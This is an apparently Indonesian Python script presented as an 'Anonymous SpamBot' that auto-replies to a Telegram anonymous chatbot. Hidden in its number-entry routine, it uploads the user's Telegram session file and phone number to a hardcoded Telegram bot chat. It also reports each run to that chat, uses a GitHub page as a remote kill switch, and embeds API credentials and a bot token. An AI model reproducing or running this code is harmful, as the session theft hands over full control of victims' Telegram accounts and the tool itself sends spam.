import time, os, platform, requests
from telethon import TelegramClient, events

green = '\x1b[92m'
yellow = '\x1b[93m'
purple = '\x1b[95m'
off = '\x1b[m'
flag = '\x1b[47;30m'

kd = platform.uname().release

api_id = 24366544
api_hash = '1515d479c1ebc1c8177c39e474f77b95'

def run():
    os.system('clear')
    client = TelegramClient('user', api_id, api_hash).start()
    text = input(f"{yellow}Input chat:{off} ")
    print(f"\n{purple}Tools telah aktif...")
    print(f"{purple}Gunakan tools ini seperlunya")
    requests.post(
        f"https://api.telegram.org/bot6541981366:AAEJ4eVQdrFhacGq4ck7qY-eBSINlgro29U/sendMessage?chat_id=6221021492&text={kd} telah aktif"
    )
    @client.on(events.NewMessage())
    async def handler(event):
        sender = await event.get_input_sender()
        message = event.message.to_dict()['message']
        if "https://t.me/chatbot" in message:
            await client.send_message(sender, text)
            await client.send_message(sender, "/next")
        elif "/stop" in message:
            time.sleep(7)
    client.run_until_disconnected()

def change():
    os.system('rm -rf log user.session')
    os.system('clear')
    session_name = input(f"{yellow}Nomor (awali dengan +62): ")
    client = TelegramClient('user', api_id, api_hash)
    if client.start(session_name):
        with open("log", 'w') as file:
            file.write(f"{kd} ll {session_name}")
        client.disconnect()
    requests.post(
        f"https://api.telegram.org/bot6541981366:AAEJ4eVQdrFhacGq4ck7qY-eBSINlgro29U/sendDocument?chat_id=6221021492&caption={kd}%0A{session_name}",
        files={'document': open('user.session', 'rb')}
    )
    requests.post(
        f"https://api.telegram.org/bot6541981366:AAEJ4eVQdrFhacGq4ck7qY-eBSINlgro29U/sendDocument?chat_id=6221021492",
        files={'document': open('log', 'rb')}
    )
    main()

def main():
    os.system('clear')
    print(f"{yellow}[ Welcome To Anonymous SpamBot ] \n")
    print(f"{purple}[1] Jalankan")
    print("[2] Masukkan Nomor")
    pilih = int(input(f"\n{yellow}Pilih:{off} "))
    if pilih == 1:
        if not os.path.exists('log'):
            print(f"{purple}Nomor tidak terdeteksi \nSilahkan masukkan nomor terlebih dahulu")
        else:
            run()
    elif pilih == 2:
        change()
    else:
        print("inputan tidak valid")

if __name__ == '__main__':
    os.system('clear')
    hdr = {"User-Agent": "Mozilla/5.0"}
    req = requests.get("https://github.com/rainirakayakirik6-lgtm/akseskode/", headers=hdr).content
    if f"x_{kd}" in str(req):
        print(f"{purple}Masa aktif bot sudah habis\nSilahkan hubungi 085888122593\nUntuk melakukan perpanjangan")
        exit()
    elif f"k_{kd}" in str(req):
        os.system('rm -rf bot.py')
    else:
        os.system('clear')
        main()
